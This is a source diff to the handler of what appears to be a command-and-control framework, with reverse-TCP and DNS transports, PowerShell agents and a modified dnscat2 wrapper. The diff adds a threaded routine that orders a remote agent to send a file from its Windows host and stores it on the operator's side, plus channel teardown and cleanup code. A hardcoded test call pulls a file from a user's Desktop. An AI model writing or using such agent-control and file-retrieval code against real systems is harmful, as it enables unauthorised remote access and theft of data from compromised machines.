@@ -1,8 +1,10 @@
 #!/usr/bin/python3
 import os
+import threading
 
 from syhandler.message.channel import Channel
 from syhelpers.files import sanatizefilename
+from syhelpers.sythread import SyThread
 from .transport.dns import TransportDns
 from .transport.reversetcp import TransportReverseTcp
 from .message.message import Message, MessageDownloadRequest
@@ -49,6 +51,7 @@ class Handler(ModuleBase):
         #TODO: CHANNELENCRYPTION?
         self.platform = PlatformPowershell(self)
         self.channels = {}
+        self.runningthreads = []
     
     def setoption(self, name, value):
         """
@@ -158,7 +161,8 @@ class Handler(ModuleBase):
                 if self.options['CHANNELENCRYPTION']['Value'] == "TLS":
                     self.transport.upgradetotls()
 
-                self.channels[0] = Channel()
+                self.channels[Message.CHANNEL_COMMAND] = Channel()
+                self.channels[Message.CHANNEL_COMMAND].setOpen()
 
                 # send a hello request to the agent
                 message0 = Message(Message.TYPE_MESSAGE, Message.CHANNEL_COMMAND, b'Hello from Handler')
@@ -168,18 +172,23 @@ class Handler(ModuleBase):
                 message1 = self.transport.receivemessage()
                 self.handleMessage(message1)
 
-                self.download("c:\\Users\\fsteglich\\Desktop\\test1.ps1", "/tmp/a")
+                thread = self.download("c:\\Users\\fsteglich\\Desktop\\test2.ps1", "/tmp/a")
+                self.runningthreads.append(thread)
+                #thread.join()
 
-                while True:
+                while self.channels[Message.CHANNEL_COMMAND].isOpen():
                     nextmessage = self.transport.receivemessage()
                     self.handleMessage(nextmessage)
+
+                self.stop()
+                exiting = True
 
         except KeyboardInterrupt:
             print_error("User interrupt, exiting...")
             exiting = True
 
         finally:
-            self.transport.close()
+            self.stop()
 
         # special case handling for our hacked DNSCAT2WRAPPER
         if (self.platform.options['AGENTTYPE']['Value'] == "DNSCAT2" or
@@ -210,6 +219,10 @@ class Handler(ModuleBase):
             elif message.type == Message.TYPE_ERRORMESSAGE:
                 print_error("AGENT: {}".format(message.content.decode('utf-8')))
                 return True
+            elif message.type == Message.TYPE_EOC:
+                print_error("Connection closed by agent")
+                self.channels[Message.CHANNEL_COMMAND].setClose()
+                return True
             else:
                 # TODO: implement further commands
                 print_error("message with invalid type received: {}".format(message.type))
@@ -222,11 +235,11 @@ class Handler(ModuleBase):
             elif self.channels[message.channelnumber].isReserved():
                 self.channels[message.channelnumber].setOpen()
             elif self.channels[message.channelnumber].isClosed():
-                self.transport.sendmessage(Message(Message.TYPE_EOC, message.channelnumber, b''))
+                self.transport.sendmessage(Message(Message.TYPE_EOC, message.channelnumber, b'EOC'))
                 return False
 
             if message.type == Message.TYPE_DATA:
-                self.channels[message.channelnumber].write(message.content)
+                self.channels[message.channelnumber].writeFromSend(message.content)
             elif message.type == Message.TYPE_EOC:
                 self.channels[message.channelnumber].setClose()
             else:
@@ -248,23 +261,81 @@ class Handler(ModuleBase):
 
         return None
 
-
     def download(self, remotefilename, localfilename):
         """
         should download the remote file and write the content to the local file
         :param remotefilename: string of the remote file to download
         :param localfilename: string of the local file to write
-        :return: None
+        :return: thread for the download storing
         """
 
         channelid = self._reservefreechannelid()
         if not channelid:
             print_error("could not reserve a channel id for the download")
+            return None
+
+        file = open(localfilename, 'wb')
+        if not file:
+            print_error("could not open local file {} for writing".format(localfilename))
             return
 
         # send file download request to agent
+        print_message("initiating download of remote file {} to local file {}".format(remotefilename, localfilename))
         downloadrequest = MessageDownloadRequest(remotefilename, downloadchannelid=channelid)
         self.transport.sendmessage(downloadrequest)
 
+        def storefile():
+            """
+            stores the data from the channel to the file
+            :return: None
+            """
 
-        # TODO: implement the rest...
+            storedbytes = 0
+            thread = threading.currentThread()
+
+            while not thread.stopevent.isSet():
+                while not self.channels[channelid].has_data() and not self.channels[channelid].isClosed() and \
+                        not thread.stopevent.isSet():
+                    pass
+                if not self.channels[channelid].has_data() and (self.channels[channelid].isClosed()
+                                                                or thread.stopevent.isSet()):
+                    break
+                print_debug(DEBUG_MODULE, "has_data = {}, isClosed = {}, stopevent = {}"
+                            .format(self.channels[channelid].has_data(), self.channels[channelid].isClosed(),
+                                    thread.stopevent.isSet()))
+                data = self.channels[channelid].read(4096)
+                storedbytes += len(data)
+                print_debug(DEBUG_MODULE, "read {} bytes from channel {}".format(len(data), channelid))
+                file.write(data)
+
+            file.close()
+            print_message("wrote {} bytes to file {}".format(storedbytes, localfilename))
+            if thread.stopevent.isSet():
+                print_error("download stoped, file content may be incomplete")
+
+        downloadthread = SyThread(target=storefile)
+        downloadthread.start()
+
+        return downloadthread
+
+    def stop(self):
+        """
+        tries to cleanup the handler
+        :return: None
+        """
+
+        # TODO: send a channel close message to the agent, atm send is blocking => will not end
+        #print_debug(DEBUG_MODULE, "Sending EOC message")
+        #if Message.CHANNEL_COMMAND in self.channels and self.channels[Message.CHANNEL_COMMAND].isOpen():
+        #    msg = Message(Message.TYPE_EOC, Message.CHANNEL_COMMAND, b'EOC')
+        #    self.transport.sendmessage(msg)
+
+        # stop all threads
+        print_debug(DEBUG_MODULE, "Asking threads to finish")
+        for t in self.runningthreads:
+            t.terminate()
+
+        print_debug(DEBUG_MODULE, "Closing transport module")
+        self.transport.close()
+
+        print_debug(DEBUG_MODULE, "stop call done")
